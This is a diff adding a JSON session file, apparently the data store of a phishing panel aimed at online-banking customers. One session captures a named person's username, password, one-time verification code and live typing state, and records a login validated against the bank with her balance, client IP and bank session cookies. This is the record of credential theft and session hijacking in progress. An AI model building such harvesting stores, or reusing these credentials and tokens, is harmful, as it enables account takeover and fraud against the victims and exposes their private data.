@@ -1,0 +1,72 @@
+{
+  "guardado": 1793845881452,
+  "sesiones": [
+    {
+      "sid": "smw2wyqcwhwnivj",
+      "creado": 1793844945392,
+      "visto": 1793845873464,
+      "ip": "127.0.0.1",
+      "geo": {
+        "countryCode": "LOCAL",
+        "country": "Red local",
+        "flag": "🖥️"
+      },
+      "flujo": "personas",
+      "paso": "code",
+      "usuario": "GABRIELALUCAS7",
+      "clave": "0951255116MJ",
+      "dispositivo": "yooo",
+      "codigo": "87899870",
+      "codigoSms": "",
+      "tecleando": {
+        "campo": "codigo",
+        "ts": 1793845872318
+      },
+      "avatarUrl": "/api/avatar?path=%2Febanking%2FimagesAvatar%2F5313",
+      "nombreImagen": "ALEYDA",
+      "login": {
+        "valido": true,
+        "resultado": "dashboard",
+        "nombre": "Gabriela Lucas",
+        "saldo": "Saldo total: $2.00",
+        "ipClient": "138.84.53.174",
+        "ts": 1793845858766
+      },
+      "empresaLogin": null,
+      "codigoVeredicto": null,
+      "sms": null,
+      "saldoConsulta": null,
+      "bancoSession": {
+        "JSESSIONID": "h5upi3dgftiGAsIdNWIIf3dLDmp1WYiW-SjvQfBNKbFeWpFFUswc!-251562651",
+        "ActiveID": "6904b600a8674d01a09659d357777677"
+      }
+    },
+    {
+      "sid": "smw2x3aptk5msp5",
+      "creado": 1793845158401,
+      "visto": 1793845158401,
+      "ip": "127.0.0.1",
+      "geo": {
+        "countryCode": "LOCAL",
+        "country": "Red local",
+        "flag": "🖥️"
+      },
+      "flujo": "personas",
+      "paso": "user",
+      "usuario": "",
+      "clave": "",
+      "dispositivo": "",
+      "codigo": "",
+      "codigoSms": "",
+      "tecleando": null,
+      "avatarUrl": null,
+      "nombreImagen": null,
+      "login": null,
+      "empresaLogin": null,
+      "codigoVeredicto": null,
+      "sms": null,
+      "saldoConsulta": null,
+      "bancoSession": null
+    }
+  ]
+}
